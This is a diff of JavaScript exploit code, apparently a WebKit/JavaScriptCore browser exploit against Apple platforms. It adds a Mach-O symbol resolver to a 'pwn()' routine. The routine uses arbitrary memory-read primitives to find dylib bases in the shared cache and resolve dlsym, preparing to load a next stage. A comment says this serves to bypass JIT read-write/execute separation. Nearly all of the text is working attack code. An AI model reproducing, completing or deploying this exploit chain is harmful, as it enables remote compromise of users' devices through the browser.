@@ -165,10 +165,8 @@ function find_dylib_by_name(macho_base, name) {
         var vm_size = read64(Add(macho_base, 0x40));
 
         var next_dylib = Add(macho_base, vm_size)
-        // log(`[+] read64 next_dylib: ${read64(next_dylib)}`);
 
         dylib_name = get_dylib_name(next_dylib);
-        // log(`[*] dylib_name: ${dylib_name}`);    //FOR CHECK if it's working
 
         if(dylib_name.includes(name)) {
             log(`[*] dylib_name: ${dylib_name}`);
@@ -177,6 +175,99 @@ function find_dylib_by_name(macho_base, name) {
 
         macho_base = next_dylib;
     }
+
+    return 0;
+}
+
+function find_symbol_address(macho_base, name) {
+    var ncmds = read32(Add(macho_base, 0x10));
+    var ptr = Add(macho_base, 0x20);
+
+    var symtab_cmd = 0;
+    for (var i = 0; i < ncmds; i++) {
+        var lc = ptr;
+        var lc_cmd = read32(lc);
+        if (lc_cmd == 2) {
+            symtab_cmd = lc;
+            break;
+        }
+
+        var lc_cmdsize = read32(Add(lc, 4)); //offsetof(load_command, cmdsize)=4
+        ptr = Add(ptr, lc_cmdsize);
+    }
+    log(`[*] symtab_cmd: ${symtab_cmd}`);
+
+
+
+    ptr = Add(macho_base, 0x20);
+    var text_segment = 0;
+    for (var i = 0; i < ncmds; i++) {
+        var sc = ptr;
+        var sc_segname = readString(Add(sc, 8));
+        log(`[*] sc_segname: ${sc_segname}`);
+        if(sc_segname === "___TEXT") {
+			text_segment = sc;
+            break;
+        }
+
+        var sc_cmdsize = read32(Add(sc, 4));
+        ptr = Add(ptr, sc_cmdsize);
+    }
+    log(`[*] text_segment: ${text_segment}`);
+    var text_segment_vmaddr = read32(Add(text_segment, 0x18));
+	var slide = Sub(macho_base, text_segment_vmaddr);
+	log(`[*] slide: ${slide}`);
+
+
+
+
+
+
+
+
+    ptr = Add(macho_base, 0x20);
+	var linkedit_segment = 0;
+	for (var i = 0; i < ncmds; i++) {
+        var sc = ptr;
+        var sc_segname = readString(Add(sc, 8));
+        if(sc_segname === "___LINKEDIT") {
+            linkedit_segment = sc;
+            break;
+        }
+        var sc_cmdsize = read32(Add(sc, 4));
+        ptr = Add(ptr, sc_cmdsize);
+    }
+    log(`[*] linkedit_segment: ${linkedit_segment}`);
+    var linkedit_segment_vmaddr = read32(Add(linkedit_segment, 0x18));
+    var linkedit_segment_fileoff = read32(Add(linkedit_segment, 0x28));
+	var linkedit_base = Sub(Add(slide, linkedit_segment_vmaddr), linkedit_segment_fileoff);
+	log(`[*] linkedit_base: ${linkedit_base}`);
+
+
+
+
+
+
+    var string_table = Add(linkedit_base, read32(Add(symtab_cmd, 0x10)));
+    var sym_table = Add(linkedit_base, read32(Add(symtab_cmd, 8)));
+    var nsyms = read32(Add(symtab_cmd, 0xc));
+
+    // 3) 모든 심볼 순회하며 이름 비교
+    for (var i = 0; i < nsyms; i++) {
+        var symtable_n_value = read64(Add(sym_table, i * 16 + 8));     //sym_table[i].n_value
+        if(symtable_n_value) {
+            var strtab_offset = read32(Add(sym_table, i * 16 + 0));
+
+            var current_symbol_name = readString(Add(string_table, strtab_offset));
+            if (current_symbol_name === name) {
+               	var addr = symtable_n_value;
+               	return new Int64(Sub(addr, Sub(text_segment_vmaddr, 0x100000000)) & 0xfffffffff);
+            }
+        }
+    }
+
+
+
 
     return 0;
 }
@@ -380,6 +471,9 @@ function pwn() {
     var jsc_base = find_dylib_by_name(libcpp1_base, "JavaScriptCore")
     log(`[+] jsc_base: ${jsc_base}`);
 
+    var dyld_shared_cache_addr = Sub(libcpp1_base, 0x31000);
+    log(`[+] dyld_shared_cache_addr: ${(dyld_shared_cache_addr)}`);
+
     var coreaudio_base = find_dylib_by_name(libcpp1_base, "CoreAudio")
     log(`[+] coreaudio_base: ${coreaudio_base}`);
 
@@ -392,26 +486,12 @@ function pwn() {
     var libsystem_kernel_base = find_dylib_by_name(libcpp1_base, "libsystem_kernel")
     log(`[+] libsystem_kernel_base: ${libsystem_kernel_base}`);
 
-
-    var lc = Add(libdyld_base, 0x20);
-    var lc_cmd;
-    while(true) {
-        lc_cmd = read32(lc)
-        if(lc_cmd == 0x2) { //LC_SYMTAB
-            log(`[+] Found LC_SYMTAB at: ${lc}`);
-            break;
-        }
-
-        var cmdsize = read32(Add(lc, 0x4));
-        lc = Add(lc, cmdsize)
-    }
-    
-
-    // remove this "return" if finished patchfinder
-    return;
+    var dlsym_addr = find_symbol_address(libdyld_base, "__dlsym");
+    log(`[+] dlsym: ${dlsym_addr}`);
 
     // needed arguments to call stage1's _load
-    var dlsym = Add(libdyld_base, offsets.dlsym);
+    var dlsym = Add(libdyld_base, dlsym_addr);
+    
 
     // needed to bypass seperated RW, RX JIT mitigation
     var __MergedGlobals_52 = read64(Add(jsc_base, offsets.__MergedGlobals_52));
